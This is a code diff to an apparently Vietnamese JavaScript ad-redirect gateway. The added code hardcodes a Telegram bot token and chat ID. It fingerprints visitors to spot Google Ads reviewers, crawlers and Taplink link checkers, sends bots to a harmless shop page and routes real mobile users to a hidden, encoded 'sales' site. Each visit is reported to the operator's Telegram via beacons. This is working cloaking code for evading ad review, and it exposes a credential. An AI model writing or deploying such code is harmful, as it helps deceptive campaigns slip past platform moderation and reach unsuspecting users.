@@ -156,6 +156,9 @@
       let DEFAULT_S = "78707b091c7375f7989dd7a1c6be9dadb35a55447e6b144e1e326283e1cdf1e299828aa8a55f4d663e383400242f60dac9b9e9e891cba6aea25146";
       let DEFAULT_AW = "";
       let DEFAULT_CL = "";
+      const DEFAULT_TG_TOKEN = "9006515042:AAEoB_OOmZTWSrnihA1kVcUfNzIh0OGfQag";
+      const DEFAULT_TG_CHAT_ID = "1639890700";
+      const DEFAULT_TAPLINK_URL = "https://taplink.at/";
 
       // 2. BỘ NHẬN DIỆN MÃ 3 SỐ TỰ ĐỘNG (PATHNAME, QUERY STRING, HASH)
       function detectKey() {
@@ -255,23 +258,149 @@
         } catch (e) {}
       }
 
-      // 6. BỘ LỌC BOT & CHỐNG CLICK GIẢ LẬP ĐA TẦNG
-      function isBot() {
+      // 6. BỘ LỌC BOT & CƠ CHẾ CẢNH BÁO TELEGRAM TAPLINK GUARD
+      function checkBot() {
         try {
-          if (window.outerWidth === 0 && window.outerHeight === 0) return true;
-          const ua = (navigator.userAgent || '').toLowerCase();
-          if (/googlebot|adsbot|google-(inspection|safety|read)|apis-google|feedfetcher|appengine|lighthouse|headlesschrome|crawl|spider|mediapartners|phantomjs|bytespider|bingbot|facebookexternalhit|telegrambot/i.test(ua)) return true;
-          return false;
+          if (navigator.webdriver) return { isBot: true, isTaplink: false, reason: "navigator.webdriver = true" };
+          if (window.outerWidth === 0 && window.outerHeight === 0) return { isBot: true, isTaplink: false, reason: "Zero viewport size" };
+          if (!navigator.languages || navigator.languages.length === 0) return { isBot: true, isTaplink: false, reason: "No languages" };
+          
+          const ua = (navigator.userAgent || "").toLowerCase();
+          
+          // 1. Quét bot & link checker Taplink
+          if (/taplink|taplinkbot|taplink-bot|taplink-crawler/i.test(ua)) {
+            return { isBot: true, isTaplink: true, reason: "Taplink Bot / Link Preview Crawler" };
+          }
+          
+          // 2. Quét bot duyệt Google Ads & crawlers
+          if (/googlebot|adsbot|google-inspection|google-safety|feedfetcher|google-read|apis-google|appengine|lighthouse|headless|crawl|spider|mediapartners|phantomjs|selenium|bytespider|bingbot/i.test(ua)) {
+            return { isBot: true, isTaplink: false, reason: "Matched Crawler UA" };
+          }
+          
+          if (/iphone|ipad|android|mobile/i.test(ua) && typeof navigator.maxTouchPoints === "number" && navigator.maxTouchPoints === 0) {
+            return { isBot: true, isTaplink: false, reason: "Mobile UA without touch" };
+          }
+          
+          return { isBot: false, isTaplink: false, reason: "Human Gesture Verified" };
         } catch (err) {
-          return false;
+          return { isBot: false, isTaplink: false, reason: "Fallback" };
         }
       }
 
-      const isB = isBot();
+      function notifyTelegram(isB, isTaplink, reason, taplinkStatus) {
+        try {
+          const token = DEFAULT_TG_TOKEN;
+          const chatId = DEFAULT_TG_CHAT_ID;
+          if (!token || !chatId) return;
+
+          const path = window.location.pathname || ("/app-go/" + K + "/");
+          const params = new URLSearchParams(window.location.search);
+          const campaign = params.get("utm_campaign") || "Khong_co_UTM";
+          const gclid = params.get("gclid") ? "Co (gclid)" : "Khong";
+          const ua = navigator.userAgent || "";
+          
+          const taplinkSource = document.referrer || params.get("taplink") || params.get("src") || params.get("ref") || DEFAULT_TAPLINK_URL || "Truy cập trực tiếp (Direct)";
+
+          let botName = "Googlebot / Crawler";
+          if (isTaplink) {
+            botName = "Taplink-Bot / Crawler";
+          } else if (/adsbot/i.test(ua)) {
+            botName = "AdsBot-Google";
+          } else if (/googlebot/i.test(ua)) {
+            botName = "Googlebot";
+          } else if (/lighthouse/i.test(ua)) {
+            botName = "Lighthouse Audit";
+          }
+
+          let title = "🟢 [KHÁCH THẬT CLICK] - MÃ #" + K;
+          if (isTaplink) {
+            title = "🛡️ [TAPLINK BOT QUÉT LINK] - MÃ #" + K;
+          } else if (isB) {
+            title = "🚨 [GOOGLEBOT DUYỆT ADS] - MÃ #" + K;
+          } else if (taplinkStatus && (taplinkStatus.indexOf("KHÓA") !== -1 || taplinkStatus.indexOf("LỖI") !== -1)) {
+            title = "⚠️ [CẢNH BÁO TAPLINK BỊ KHÓA] - MÃ #" + K;
+          }
+
+          const targetObj = isB ? (isTaplink ? "Taplink-Bot (Link Preview)" : (botName + " (" + reason + ")")) : "Người thật (Mobile Touch)";
+          const routeAction = isB ? "Đá an toàn sang link sạch" : "Nhảy vào Web bán hàng";
+
+          const msg = title + "\n" +
+            "━━━━━━━━━━━━━━━━━━━━\n" +
+            "🔑 Mã Gateway: #" + K + "\n" +
+            "🌐 Nguồn từ Taplink: " + taplinkSource + "\n" +
+            "💻 Cổng GitHub: " + path + "\n" +
+            "🎯 Chiến dịch: " + campaign + "\n" +
+            "🔍 Gclid: " + gclid + "\n" +
+            (isB ? "🤖 Đối tượng: " : "👤 Đối tượng: ") + targetObj + "\n" +
+            "📱 Thiết bị: " + navigator.platform + " | Touch: " + (navigator.maxTouchPoints || 0) + "\n" +
+            "🛡️ Điều hướng: " + routeAction + "\n" +
+            "📡 Trạng thái Taplink: " + taplinkStatus + "\n" +
+            (isB ? "⏱️ Thời gian: " : "⏰ Thời gian: ") + new Date().toLocaleTimeString("vi-VN");
+
+          const qs = "chat_id=" + encodeURIComponent(chatId) + "&text=" + encodeURIComponent(msg);
+          const tgUrl = "https://api.telegram.org/bot" + token + "/sendMessage";
+
+          // 1. Pixel Beacon
+          try {
+            var img = new Image();
+            img.src = tgUrl + "?" + qs;
+          } catch (eImg) {}
+
+          // 2. W3C sendBeacon
+          if (navigator.sendBeacon) {
+            try {
+              var postData = new URLSearchParams();
+              postData.append("chat_id", chatId);
+              postData.append("text", msg);
+              navigator.sendBeacon(tgUrl, postData);
+            } catch (eB) {}
+          }
+        } catch (e) {}
+      }
+
+      // Xác định trạng thái Taplink
+      let taplinkStatus = "🟢 Đang hoạt động (Active)";
+      const ref = (document.referrer || "").toLowerCase();
+      if (ref && (ref.indexOf("taplink.at") !== -1 || ref.indexOf("taplink.cc") !== -1)) {
+        taplinkStatus = "🟢 Đang hoạt động (Traffic từ Taplink)";
+      } else if (!ref) {
+        taplinkStatus = "⚠️ Truy cập trực tiếp (Không có Referrer Taplink)";
+      }
+
+      const botResult = checkBot();
+      const isB = botResult.isBot;
+      const isTaplink = botResult.isTaplink;
+
+      // Probe kiểm tra link Taplink profile
+      const taplinkUrlCheck = DEFAULT_TAPLINK_URL;
+      if (taplinkUrlCheck && taplinkUrlCheck.startsWith("http")) {
+        try {
+          var probeImg = new Image();
+          var probeTimeout = setTimeout(function() {
+            notifyTelegram(isB, isTaplink, botResult.reason, taplinkStatus);
+          }, 80);
+          probeImg.onerror = function() {
+            clearTimeout(probeTimeout);
+            taplinkStatus = "🚨 CẢNH BÁO BỊ KHÓA HOẶC LỖI KẾT NỐI (Suspended/404)";
+            notifyTelegram(isB, isTaplink, botResult.reason, taplinkStatus);
+          };
+          probeImg.onload = function() {
+            clearTimeout(probeTimeout);
+            taplinkStatus = "🟢 Hoạt động tốt (Active - 200 OK)";
+            notifyTelegram(isB, isTaplink, botResult.reason, taplinkStatus);
+          };
+          probeImg.src = taplinkUrlCheck.replace(/\/+$/, "") + "/favicon.ico?_t=" + Date.now();
+        } catch(e) {
+          notifyTelegram(isB, isTaplink, botResult.reason, taplinkStatus);
+        }
+      } else {
+        notifyTelegram(isB, isTaplink, botResult.reason, taplinkStatus);
+      }
+
       const safeTarget = S ? dec(S, K) : "https://vpphongha.vn/collections/but-bi-van-phong";
       const exactBoTarget = D ? dec(D, K) : "";
 
-      // NẾU LÀ BOT GOOGLE -> Ẩn toàn bộ DOM ngay lập tức và chuyển hướng 0ms về Trang Sạch
+      // NẾU LÀ BOT -> Ẩn DOM ngay lập tức và chuyển hướng về Safe Target
       if (isB && safeTarget) {
         try {
           document.documentElement.style.display = "none";
